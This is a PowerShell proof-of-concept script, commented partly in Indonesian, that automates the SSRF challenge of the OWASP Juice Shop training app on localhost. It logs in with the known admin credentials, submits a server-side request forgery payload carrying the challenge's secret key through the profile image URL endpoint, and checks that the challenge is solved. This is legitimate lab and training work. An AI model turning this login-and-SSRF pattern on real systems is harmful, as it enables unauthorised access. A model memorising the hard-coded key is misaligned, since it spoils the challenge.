# # ds-235150201111019 — PoC otomatis untuk <challenge>
# # OWASP Juice Shop SSRF Challenge Automation Proof of Concept (PoC)
# # Target: SSRF Challenge (Link Gravatar / profileImageUrlUpload)

# Debugging & Error Handling Script Template
$TargetHost = "http://localhost:3000"

$LoginUrl   = "$TargetHost/rest/user/login"
$ProfileUrl = "$TargetHost/profile/image/url"

$Headers = @{
    "Content-Type" = "application/json"
}

$LoginBody = @{
    email    = "admin@juice-sh.op"
    password = "admin123"
} | ConvertTo-Json

Write-Host "[*] Authenticating..." -ForegroundColor Cyan

try {
    $LoginResponse = Invoke-RestMethod -Method Post -Uri $LoginUrl -Headers $Headers -Body $LoginBody
    $Token = $LoginResponse.authentication.token
    if ([string]::IsNullOrWhiteSpace([string]$Token)) {
        throw "Login response did not contain authentication.token."
    }
    Write-Host "[+] Token received successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Login Failed!" -ForegroundColor Red
    # Menampilkan detail error dari HTTP Response
    if ($_.Exception.Response) {
        $stream = $_.Exception.Response.GetResponseStream()
        $reader = [System.IO.StreamReader]::new($stream)
        $body   = $reader.ReadToEnd()
        Write-Host "HTTP Status Code : " $_.Exception.Response.StatusCode -ForegroundColor Yellow
        Write-Host "Response Body    : $body" -ForegroundColor Yellow
    } else {
        Write-Host "Error Details: $_" -ForegroundColor Red
    }
    exit 2
}

# Juice Shop reads the login token from the `token` cookie.
$Session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$TokenCookie = New-Object System.Net.Cookie
$TokenCookie.Name = "token"
$TokenCookie.Value = [string]$Token
$TokenCookie.Path = "/"
$Session.Cookies.Add([uri]$TargetHost, $TokenCookie)

try {
    $SessionCheck = Invoke-RestMethod -Method Get -Uri "$TargetHost/rest/user/whoami" -WebSession $Session
    if ($null -eq $SessionCheck.user.id) {
        throw "Juice Shop did not accept the login cookie."
    }
    Write-Host "[+] Session verified." -ForegroundColor Green
}
catch {
    Write-Host "[-] Session verification failed: $_" -ForegroundColor Red
    exit 2
}

# Require a fresh challenge state so an earlier solve cannot yield a false success.
try {
    $Before = Invoke-RestMethod -Method Get -Uri "$TargetHost/api/Challenges/?key=ssrfChallenge" -WebSession $Session
    if ($null -eq $Before.data[0].solved) { throw "Challenge status missing." }
    if ($Before.data[0].solved -eq $true) {
        Write-Host "[-] Challenge already solved; restart with a fresh challenge state before testing." -ForegroundColor Yellow
        exit 2
    }
}
catch {
    Write-Host "[-] Could not read initial challenge status: $_" -ForegroundColor Red
    exit 2
}

$PayloadUrl = "$TargetHost/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3&wm=ds-235150201111019"
$ProfileBody = "imageUrl=$([uri]::EscapeDataString($PayloadUrl))"


Write-Host "[*] Sending request to profile image URL endpoint..." -ForegroundColor Cyan

try {
    $null = Invoke-RestMethod -Method Post -Uri $ProfileUrl -WebSession $Session -ContentType "application/x-www-form-urlencoded" -Body $ProfileBody
    Write-Host "[+] SSRF payload submitted." -ForegroundColor Green
}
catch {
    Write-Host "[-] Request Exception Caught!" -ForegroundColor Red
    
    # Menangkap Stream Response dari Server (HTTP Status 4xx / 5xx)
    if ($_.Exception.Response) {
        $statusCode = [int]$_.Exception.Response.StatusCode
        $statusDesc = $_.Exception.Response.StatusCode
        
        Write-Host "HTTP Status : $statusCode ($statusDesc)" -ForegroundColor Yellow
        
        $stream = $_.Exception.Response.GetResponseStream()
        if ($null -ne $stream) {
            $reader = [System.IO.StreamReader]::new($stream)
            $responseBody = $reader.ReadToEnd()
            Write-Host "Response Body:" -ForegroundColor Yellow
            Write-Host $responseBody -ForegroundColor Gray
        }
    } else {
        Write-Host "Exception details: $_" -ForegroundColor Red
    }
    exit 2
}

try {
    $Challenge = Invoke-RestMethod -Method Get -Uri "$TargetHost/api/Challenges/?key=ssrfChallenge" -WebSession $Session
    if ($null -eq $Challenge.data[0].solved) { throw "Challenge status missing." }
    if ($Challenge.data[0].solved -ne $true) {
        Write-Host "[-] SSRF challenge is not solved." -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] SSRF challenge solved." -ForegroundColor Green
    exit 0
}
catch {
    Write-Host "[-] Could not verify SSRF challenge: $_" -ForegroundColor Red
    exit 2
}
